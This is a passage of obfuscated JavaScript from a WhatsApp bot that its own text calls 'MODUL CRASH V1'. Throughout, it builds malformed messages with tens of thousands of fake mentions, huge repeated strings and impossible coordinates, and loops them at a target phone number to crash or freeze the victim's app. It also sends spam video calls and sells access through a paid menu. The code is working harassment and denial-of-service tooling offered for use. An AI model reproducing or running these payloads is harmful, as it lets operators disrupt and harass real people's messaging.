        _0x554340.attrs.is_status_mention = " null - exexute ";
        const _0x52ad6c = {
          additionalNodes: [_0x554340]
        };
        await _0x40d3ea.relayMessage(_0x1b1e71, _0x18e0ef, _0x52ad6c);
      }
    }
    async function _0x121b3d(_0x1db0cc, _0x451054) {
      const _0x590df2 = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000);
      const _0x4ffc34 = {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              caption: "Curserd",
              fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
              fileLength: "19769",
              height: 354,
              width: 783,
              mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
              fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
              directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              mediaKeyTimestamp: "1743225419",
              jpegThumbnail: null,
              scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
              scanLengths: [2437, 17332],
              contextInfo: {
                mentionedJid: Array.from({
                  length: 40000
                }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                isSampled: true,
                participant: _0x1db0cc,
                remoteJid: "status@broadcast",
                forwardingScore: 9999,
                isForwarded: true
              }
            }
          }
        }
      };
      const _0x5d3687 = generateWAMessageFromContent(_0x1db0cc, _0x4ffc34, {});
      await _0x40d3ea.relayMessage("status@broadcast", _0x5d3687.message, {
        messageId: _0x5d3687.key.id,
        statusJidList: [_0x1db0cc],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x1db0cc
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x451054) {
        const _0xbc9836 = {
          key: _0x5d3687.key,
          type: 25
        };
        const _0x4583a6 = {
          protocolMessage: _0xbc9836
        };
        const _0x28e702 = {
          message: _0x4583a6
        };
        const _0x37c2a7 = {
          statusMentionMessage: _0x28e702
        };
        const _0x18fa18 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        _0x18fa18.attrs.is_status_mention = "MODUL CRASH FASE 𝟏";
        const _0x145bb7 = {
          additionalNodes: [_0x18fa18]
        };
        await _0x40d3ea.relayMessage(_0x1db0cc, _0x37c2a7, _0x145bb7);
      }
    }
    async function _0x413315(_0xf48b00, _0x5a7679, _0x4786ec) {
      const _0x8804c3 = ["13135550002@s.whatsapp.net", ...Array.from({
        length: 40000
      }, () => "1" + Math.floor(Math.random() * 2000000) + "@s.whatsapp.net")];
      const _0x48474f = {
        isSampled: true,
        mentionedJid: _0x8804c3
      };
      const _0x38811c = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: _0x48474f,
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
      };
      const _0x263f7c = _0x38811c;
      const _0x4ff586 = {
        videoMessage: _0x263f7c
      };
      const _0x2d7b6e = {
        message: _0x4ff586
      };
      const _0x4c1fe8 = {
        viewOnceMessage: _0x2d7b6e
      };
      const _0x365d5a = generateWAMessageFromContent(_0x5a7679, _0x4c1fe8, {});
      await _0xf48b00.relayMessage("status@broadcast", _0x365d5a.message, {
        messageId: _0x365d5a.key.id,
        statusJidList: [_0x5a7679],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x5a7679
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x4786ec) {
        const _0x496298 = {
          key: _0x365d5a.key,
          type: 25
        };
        const _0x47f391 = {
          protocolMessage: _0x496298
        };
        const _0x12bc37 = {
          message: _0x47f391
        };
        const _0x3ca9c8 = {
          groupStatusMentionMessage: _0x12bc37
        };
        const _0x51e08e = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        _0x51e08e.attrs.is_status_mention = "true";
        const _0x5a66d9 = {
          additionalNodes: [_0x51e08e]
        };
        await _0xf48b00.relayMessage(_0x5a7679, _0x3ca9c8, _0x5a66d9);
      }
      console.log(chalk.green("PROSES SEND BUG MODUL CRASH V1"));
    }
    async function _0x4a2913(_0x29067b, _0x5e5b7b, _0x502a8e) {
      const _0x4f5b96 = generateWAMessageFromContent(_0x5e5b7b, {
        viewOnceMessage: {
          message: {
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
              fileLength: "999999",
              seconds: 999999,
              mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
              caption: "MODUL CRASH FASE 𝟏" + "🥶".repeat(101),
              height: 8,
              width: 101,
              fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
              directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1743742853",
              contextInfo: {
                isSampled: true,
                mentionedJid: ["99988877766@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
              },
              streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
              thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
              thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
              thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
              annotations: [{
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "uknown",
                    songId: "870166291800508",
                    author: "MODUL CRASH FASE 𝟏" + "᭱".repeat(9999),
                    title: "νєяѕισи ιиναѕισи",
                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution: "https://t.me/FunctionLihX",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                  }
                },
                embeddedAction: null
              }]
            }
          }
        }
      }, {});
      await _0x29067b.relayMessage("status@broadcast", _0x4f5b96.message, {
        messageId: _0x4f5b96.key.id,
        statusJidList: [_0x5e5b7b],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x5e5b7b
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x502a8e) {
        const _0x2e2873 = {
          key: _0x4f5b96.key,
          type: 25
        };
        const _0xcd1e7b = {
          protocolMessage: _0x2e2873
        };
        const _0x2e9ac4 = {
          message: _0xcd1e7b
        };
        const _0x200000 = {
          groupStatusMentionMessage: _0x2e9ac4
        };
        const _0x37daa2 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        _0x37daa2.attrs.is_status_mention = "true";
        const _0x4ba282 = {
          additionalNodes: [_0x37daa2]
        };
        await _0x29067b.relayMessage(_0x5e5b7b, _0x200000, _0x4ba282);
      }
    }
    async function _0xd68a62(_0x332af1) {
      for (let _0x22653b = 0; _0x22653b < 100; _0x22653b++) {
        console.log(chalk.green("send bug curserd grup: " + _0x22653b + "/100\ntarget : " + _0x332af1));
        await _0x28b822(_0x332af1);
        await _0x28b822(_0x332af1);
        await _0x50f6e8(_0x332af1);
        await _0x50f6e8(_0x332af1);
      }
    }
    async function _0x57c58f(_0x4ffb1e) {
      for (let _0x2de56b = 0; _0x2de56b < 50; _0x2de56b++) {
        console.log(chalk.green("send bug curserd fc " + _0x2de56b + "/50\ntarget : " + _0x4ffb1e));
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
        await _0xa4eb36(_0x4ffb1e);
        await _0x4f1dbc(_0x4ffb1e, false);
      }
    }
    async function _0x91b33(_0xf17465) {
      for (let _0x36dcc5 = 0; _0x36dcc5 < 1000; _0x36dcc5++) {
        console.log(chalk.green("send bug curserd delay invis: " + _0x36dcc5 + "/1000\ntarget : " + _0xf17465));
        await _0x591c90(_0xf17465);
        await _0x591c90(_0xf17465);
        await _0x591c90(_0xf17465);
        await _0x1c3ed0(_0xf17465, true);
        await _0x1c3ed0(_0xf17465, true);
        await _0x1c3ed0(_0xf17465, true);
        await _0x72483f(_0xf17465, true);
        await _0x72483f(_0xf17465, true);
        await _0x72483f(_0xf17465, true);
        await _0x413315(_0x40d3ea, _0xf17465, true);
        await _0x413315(_0x40d3ea, _0xf17465, true);
        await _0x413315(_0x40d3ea, _0xf17465, true);
        await _0x327d67(_0xf17465, mention = true);
        await _0x327d67(_0xf17465, mention = true);
        await _0x327d67(_0xf17465, mention = true);
        await _0x387e39(5000);
      }
    }
    async function _0x4ec319(_0x2c560d) {
      for (let _0x3d0e19 = 0; _0x3d0e19 < 5000; _0x3d0e19++) {
        console.log(chalk.green("send bug curserd delay hard: " + _0x3d0e19 + "/1000\ntarget : " + _0x2c560d));
        await _0x72483f(_0x2c560d, true);
        await _0x7b32c1(_0x40d3ea, _0x2c560d, true);
        await _0x97faef(_0x40d3ea, _0x2c560d, false);
        await _0x387e39(1500);
        await _0x121b3d(_0x2c560d, false);
        await _0x413315(_0x40d3ea, _0x2c560d, false);
        await _0x4a2913(_0x40d3ea, _0x2c560d, false);
        await _0x387e39(1500);
        await _0x1c3ed0(_0x2c560d, false);
        await _0x1c3ed0(_0x2c560d, false);
      }
    }
    async function _0x9b77e(_0x4f8275) {
      for (let _0x406e61 = 0; _0x406e61 <= 500; _0x406e61++) {
        await _0x4f1dbc(_0x4f8275, false);
        await _0x387e39(500);
      }
      var _0x34840c = await fs.readdirSync("./session");
      var _0x1de2a1 = await _0x34840c.filter(_0xa5be73 => _0xa5be73 !== "creds.json");
      for (let _0x4198ab of _0x1de2a1) {
        await fs.unlinkSync("./session/" + _0x4198ab);
      }
      process.exit(0);
    }
    const _0x396ffe = {
      force: _0xa4eb36,
      xinvis: _0x9b77e
    };
    const _0x426f17 = _0x396ffe;
    async function _0x1fb37b(_0x25e906) {
      try {
        const _0x17853a = {
          degreesLatitude: -6666666666,
          degreesLongitude: 6666666666,
          name: "𝐂𝐫𝐚𝐬𝐡",
          address: ""
        };
        const _0x1858a0 = {
          title: "𝐗",
          hasMediaAttachment: false,
          locationMessage: _0x17853a
        };
        let _0x551f68 = {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: _0x1858a0,
                body: {
                  text: "🚬"
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                },
                contextInfo: {
                  participant: _0x25e906,
                  mentionedJid: ["0@s.whatsapp.net", ...Array.from({
                    length: 30000
                  }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")]
                }
              }
            }
          }
        };
        await _0x40d3ea.relayMessage(_0x25e906, _0x551f68, {
          messageId: null,
          participant: {
            jid: _0x25e906
          },
          userJid: _0x25e906
        });
      } catch (_0x34a59e) {
        console.log(_0x34a59e);
      }
    }
    async function _0x50f6e8(_0x2980f8) {
      const _0x13e1c9 = {
        degreesLatitude: 922.999999999999,
        degreesLongitude: -9229999999999.998
      };
      const _0x1bc740 = {
        locationMessage: _0x13e1c9,
        hasMediaAttachment: true
      };
      let _0x1e74df = generateWAMessageFromContent(_0x2980f8, proto.Message.fromObject({
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: _0x1bc740,
              body: {
                text: "Per Nikahan lokasi Hutan \n " + buttonkal + "." + notif3 + "." + crash + "." + "@0 ".repeat(50000),
                contextInfo: {
                  mentionedJid: ["0@s.whatsapp.net"]
                }
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "0@s.whatsapp.net"),
                groupMentions: [{
                  groupJid: "120363301095727346@newsletter",
                  groupSubject: "𝙻𝚄𝙲𝙸𝙵𝙴𝚁  "
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x2980f8
      });
      await _0x40d3ea.relayMessage(_0x2980f8, _0x1e74df.message, {});
    }
    async function _0x1b7880(_0x3f7447, _0x5820e2) {
      try {
        await _0x3f7447.offerCall(_0x5820e2, {
          callType: "video"
        });
        console.log(chalk.white.bold("Success Send Video Call To Target"));
      } catch (_0x360932) {
        console.error(chalk.white.bold("Failed Send Video Call To Target:"), _0x360932);
      }
    }
    const _0x53af71 = {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(_0x16b374 ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x282f41 = {
      key: _0x53af71,
      message: {
        contactMessage: {
          displayName: "ＭＯＤＵＬ ＣＲＡＳＨ V1",
          vcard: "BEGIN:VCARD\nVERSION:8.5\nN:XL;KapotID,;;;\nFN:" + _0x4f3f06 + ",\nitem1.TEL;waid=" + _0x51b80a.split("@")[0] + ":" + _0x51b80a.split("@")[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          jpegThumbnail: {
            url: "https://files.catbox.moe/dat7cz.jpg"
          }
        }
      }
    };
    const _0x5f5c9f = {
      participant: "0@s.whatsapp.net",
      ...(_0x122228.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x12c3ab = {
      key: _0x5f5c9f,
      message: {
        locationMessage: {
          name: "Verifikasi Penuh Dari Whatsapp",
          jpegThumbnail: ""
        }
      }
    };
    const _0x57d7aa = _0x12c3ab;
    const _0x3dc2b7 = async (_0x466a66, _0x460e44) => {
      const _0x566a53 = {
        text: _0x460e44,
        key: _0x122228.key
      };
      const _0x1d54b2 = {
        react: _0x566a53
      };
      _0x40d3ea.sendMessage(_0x466a66, _0x1d54b2);
    };
    switch (_0x5e99b8) {
      case "xiu":
      case "menu":
        {
          if (!_0x46588c) {
            return _0x122228.reply("LU SIAPA KOCAK");
          }
          await _0x40d3ea.sendMessage(_0x122228.chat, {
            react: {
              text: "🌑",
              key: _0x122228.key
            }
          });
          tramenu = '┏━[ 𝗦𝗘𝗟𝗔𝗠𝗔𝗧 𝗗𝗔𝗧𝗔𝗡𝗚 𝗗𝗜 𝗠𝗘𝗡𝗨 ]\n' +
'┃ 𝗦𝗖𝗥𝗜𝗣𝗧   : 𝗠𝗢𝗗𝗨𝗟 𝗖𝗥𝗔𝗦𝗛 𝗩𝟭\n' +
'┃ 𝗕𝗢𝗧𝗡𝗔𝗠𝗘 : 𝗠𝗢𝗗𝗨𝗟𝗕𝗢𝗧\n' +
'┗━ 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 : t.me/KapotID\n';
          const _0x13b14e = {
            quoted: _0x449ec9
          };
          _0x40d3ea.sendMessage(_0x16b374, {
            image: {
              url: "https://files.catbox.moe/dat7cz.jpg"
            },
            caption: tramenu,
            footer: "【 𝗠𝗘𝗡𝗨 】",
            buttons: [{
              buttonId: ".dev",
              buttonText: {
                displayText: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥"
              },
              type: 1
            }, {
              buttonId: "action",
              buttonText: {
                displayText: "𝗠𝗢𝗗𝗨𝗟 𝗖𝗥𝗔𝗦𝗛 𝗩𝟭"
              },
              type: 4,
              nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                  title: "[ MENU ]",
                  sections: [{
                    title: "𝗕𝗨𝗧𝗧𝗢𝗡 𝗠𝗢𝗗𝗨𝗟",
                    highlight_label: "𝗕𝗨𝗧𝗧𝗢𝗡 𝗠𝗢𝗗𝗨𝗟",
                    rows: [{
                      header: "𝗦𝗖𝗥𝗜𝗣𝗧",
                      title: "𝗣𝗥𝗘𝗠𝗜𝗨𝗠",
                      description: "𝗦𝗔𝗟𝗨𝗥𝗔𝗡 𝗦𝗖𝗥𝗜𝗣𝗧",
                      id: ".script"
                    }, {
                      header: "𝗕𝗨𝗚 𝗠𝗘𝗡𝗨",
                      title: "",
                      description: "",
                      id: ".bugmenu"
                    }]
                  }]
                })
              }
            }],
            headerType: 1,
            viewOnce: true
          }, _0x13b14e);
          const _0x5b1822 = {
            audio: _0x5dd251,
            mimetype: "audio/mpeg",
            ptt: true
          };
          const _0x5e4306 = {
            quoted: _0x282f41
          };
          await _0x40d3ea.sendMessage(_0x122228.chat, _0x5b1822, _0x5e4306);
        }
        break;
case "bugmenu":
{
  if (!_0x46588c) {
    return _0x122228.reply("➤ 𝗩𝗩𝗜𝗣 𝗔𝗖𝗖𝗘𝗦𝗦 • 𝗕𝗨𝗬𝗘𝗥 𝗢𝗡𝗟𝗬 ⬅");
  }
  
    let _0x1eb81b = '𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 𝐌𝐎𝐃𝐔𝐋 𝐂𝐑𝐀𝐒𝐇 𝐕𝟏\n' +
'𝐉𝐀𝐍𝐆𝐀𝐍 𝐋𝐔𝐏𝐀 𝐒𝐄𝐋𝐀𝐋𝐔 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐒𝐀𝐘𝐀\n'+
'𝐂𝐑𝐄𝐀𝐓𝐄𝐃  𝐁𝐲 𝐊𝐚𝐩𝐨𝐭𝐈𝐃\n' +
'𝐓𝐄𝐋𝐄 𝐊𝐚𝐩𝐨𝐭𝐈𝐃 : t.me/KapotID\n' +
'\n' +
'⫷ 𝗕𝗨𝗚 𝗙𝗢𝗥𝗖𝗟𝗢𝗦𝗘 ⫸\n' +
' • 𝖥𝖮𝖱𝖢𝖫𝖮𝖲𝖤 [628××]\n' +
' • 𝖥𝖢-𝖯𝖤𝖱𝖬𝖠 [628××]\n' +
' • 𝖨𝖭𝖵𝖨𝖲-𝖥𝖢 [628××]\n' +
' • 𝖥𝖢-𝖵𝖵𝖨𝖯 [628××]\n' +
'\n' +
'⫷ 𝗜𝗡𝗩𝗜𝗦 ⫸\n' +
' • 𝖪𝖮𝖱𝖴𝖯𝖳 [628××]\n' +
' • 𝖬𝖴𝖲𝖭𝖠𝖧 [628××]\n' +
' • 𝖥𝖱𝖤𝖤𝖹𝖤 [628××]\n' +
' • 𝖥𝖢-𝖲𝖸𝖲𝖳𝖤𝖬 [628××]\n' +
' • 𝖨𝖭𝖵𝖨𝖲 [628××]\n' +
' • 𝖫𝖠𝖬𝖯-𝖣𝖤𝖫𝖠𝖸 [628××]\n' +
'\n' +
'⫷ 𝗜𝗡𝗩𝗜𝗦 𝗛𝗔𝗥𝗗 ⫸\n' +
' • 𝖢𝖴𝖱𝖲𝖤𝖱𝖣-𝖧𝖠𝖱𝖣 [628××]\n' +
' • 𝖰𝖴𝖤𝖤𝖭 [628××]\n' +
' • 𝖦𝖤𝖭𝖹 [628××]\n' +
' • 𝖣𝖤𝖫𝖠𝖸-𝖧𝖠𝖱𝖣 [628××]\n' +
' • 𝖡𝖴𝖦-𝖦𝖠𝖭𝖠𝖲 [628××]\n' +
'\n' +
'⫷ 𝗕𝗨𝗚 𝗖𝗔𝗟𝗟 ⫸\n' +
' • 𝖲𝖯𝖠𝖬𝖢𝖠𝖫𝖫\n' +
' • 𝖲𝖯𝖠𝖬𝖵𝖨𝖣𝖢𝖠𝖫𝖫\n' +
'\n' +
'⫷ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ⫸\n' +
' • 𝖲𝖤𝖫𝖥\n' +
' • 𝖯𝖴𝖡𝖫𝖨𝖢\n' +
' • 𝖢𝖫𝖤𝖠𝖱𝖡𝖴𝖦\n' +
' • 𝖠𝖣𝖣𝖬𝖴𝖱𝖡𝖴𝖦\n' +
' • 𝖣𝖤𝖫𝖬𝖴𝖱𝖡𝖴𝖦\n' +
' • 𝖠𝖣𝖣𝖯𝖱𝖤𝖬\n' +
' • 𝖣𝖤𝖫𝖯𝖱𝖤𝖬\n' +
'\n' +
'⫷ 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 ⫸\n' +
' • 𝖬𝖮𝖳𝖨𝖵𝖠𝖲𝖨\n' +
' • 𝖱𝖤𝖠𝖢𝖳𝖢𝖧\n' +
' • 𝖢𝖤𝖪𝖨𝖣𝖢𝖧\n' +
' • 𝖠𝖭𝖨𝖬𝖤-𝖲𝖴𝖲\n' +
' • 𝖱𝖠𝖭𝖣𝖮𝖬-𝖨𝖬𝖠𝖦𝖤\n' +
  '\n' +
  '【𝐒𝐄𝐁𝐀𝐈𝐊𝐍𝐘𝐀 𝐉𝐀𝐍𝐆𝐀𝐍 𝐒𝐀𝐋𝐀𝐇 𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐒𝐂 𝐈𝐍𝐈 𝐋𝐄𝐁𝐈𝐇 𝐁𝐀𝐈𝐊】\n' +
  '⫸ 𝐆𝐔𝐍𝐀𝐊𝐀𝐍𝐋𝐀𝐇 𝐔𝐍𝐓𝐔𝐊 𝐏𝐀𝐑𝐀² 𝐌𝐔𝐒𝐀𝐍𝐆, 𝐉𝐀𝐍𝐆𝐀𝐍 𝐁𝐔𝐆 𝐎𝐑𝐀𝐍𝐆 𝐘𝐀𝐍𝐆 𝐓𝐈𝐃𝐀𝐊 𝐁𝐄𝐑𝐒𝐀𝐋𝐀𝐇 ⫷';

  const _0x398508 = {
    image: {
      url: "https://img1.pixhost.to/images/7320/623382776_imgtmp.jpg"
    },
    caption: _0x1eb81b,
    gifPlayback: true
  };
  
  const _0x4f80df = {
    quoted: _0x449ec9
  };

  _0x40d3ea.sendMessage(_0x16b374, _0x398508, _0x4f80df);

  const _0x28734c = {
    audio: _0x5dd251,
    mimetype: "audio/mpeg",
    ptt: true
  };
  
  const _0x5429e5 = {
    quoted: _0x282f41
  };

  await _0x40d3ea.sendMessage(_0x122228.chat, _0x28734c, _0x5429e5);
}
break;
      case "script":
      case "sc":
        {
          let _0x4f68b7 = "SCRIPT MODUL CRASH TELE DEVELOPER : t.me/KapotID";
          const _0x5e0fd1 = {
            text: _0x4f68b7,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true
              }
            }
          };
          const _0x26822c = {
            extendedTextMessage: _0x5e0fd1
          };
          _0x40d3ea.relayMessage(_0x122228.chat, {
            requestPaymentMessage: {
              currencyCodeIso4217: "IDR",
              amount1000: 50000,
              requestFrom: "@" + _0x122228.sender.split("@"),
              noteMessage: _0x26822c
            }
          }, {});
        }
        break;
      case "hidetag":
      case "oi":
        {
          if (!_0x46588c) {
            return _0x122228.reply("ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ");
          }
          if (!_0x122228.quoted && !_0x8ab39f) {
            return reply("masukan teksnya");
          }
          var _0x555411 = _0x122228.quoted ? _0x122228.quoted.text : _0x8ab39f;
          var _0x8aa6f4 = await _0x4eb3ef.participants.map(_0x409efc => _0x409efc.id);
          const _0x339e45 = {
            text: _0x555411,
            mentions: [..._0x8aa6f4]
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x339e45);
        }
        break;
      case "public":
        {
          if (!_0x46588c) {
            return _0x122228.reply("ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ");
          }
          _0x40d3ea.public = true;
          _0x4d86cf("⦃ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙗𝙤𝙩 𝙨𝙚𝙡𝙛 𝙩𝙤 𝙥𝙪𝙗𝙡𝙞𝙘 ⦄");
        }
        break;
      case "self":
        {
          if (!_0x46588c) {
            return _0x122228.reply("ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ");
          }
          _0x40d3ea.public = false;
          _0x4d86cf("⦃ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙗𝙤𝙩 𝙥𝙪𝙗𝙡𝙞𝙘 𝙩𝙤 𝙨𝙚𝙡𝙛 ⦄");
        }
        break;
      case "xdelay":
      case "delay-crash":
      case "crash-delay":
      case "crash":
        {
          if (!_0x46588c) {
            return _0x122228.reply("ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ");
          }
          if (!q) {
            return _0x4d86cf("❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: " + (_0x539711 + _0x5e99b8) + " 628×××");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let _0x5b1590 = "╔═━═━═━═━═━═━═━═╗\n║╔━━━━━━━━━━━━━╗\n║┃𝐒𝐔𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 𝐁𝐔𝐆 😈̳⃨\n║╚━━━━━━━━━━━━━╝\n║\n║TIPE BUG ⧼ " + _0x5e99b8 + " ⧽\n║\n║TARGET ⧼ " + target + " ⧽\n║\n║STATUS ⧼ sᴜᴄᴄᴇs ⧽\n║\n║ℕ𝕆𝕋𝔼 ⧼ ᴊᴇᴅᴀ 𝟻ᴍᴇɴɪᴛ ⧽\n╚═━═━═━═━═━═━═━═╝";
          const _0x2217cb = {
            image: {
              url: "https://files.catbox.moe/g8o93j.jpg"
            },
            caption: _0x5b1590,
            gifPlayback: false
          };
          const _0x3e802b = {
            quoted: _0x321efd
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x2217cb, _0x3e802b);
          const _0x340f24 = {
            quoted: _0x282f41
          };
          await _0x40d3ea.sendMessage(_0x122228.chat, {
            audio: fs.readFileSync("./gallery/curserdv3.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x340f24);
          for (let _0x15d386 = 0; _0x15d386 < 10; _0x15d386++) {
            await delaycr1(target);
            await _0x387e39(1500);
          }
          let _0x2d1576 = "*_" + _0x5e99b8 + "𝐁𝐔𝐆 𝐒𝐔𝐂𝐊𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐓𝐀𝐑𝐆𝐄𝐓 !!" + _0x5e99b8 + "_*\n> *𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚊𝚞𝚜𝚎 𝚏𝚘𝚛 5 𝚖𝚒𝚗𝚞𝚝𝚎*";
          const _0x216b07 = {
            image: {
              url: "https://files.catbox.moe/xbrl74.jpg"
            },
            caption: _0x2d1576,
            gifPlayback: false
          };
          const _0x3fbc3c = {
            quoted: _0x282f41
          };
          _0x40d3ea.sendMessage(_0x122228.chat, _0x216b07, _0x3fbc3c);
        }
        break;
      case "forclose":
      case "invis-fc":
      case "fc-perma":
      case "c":
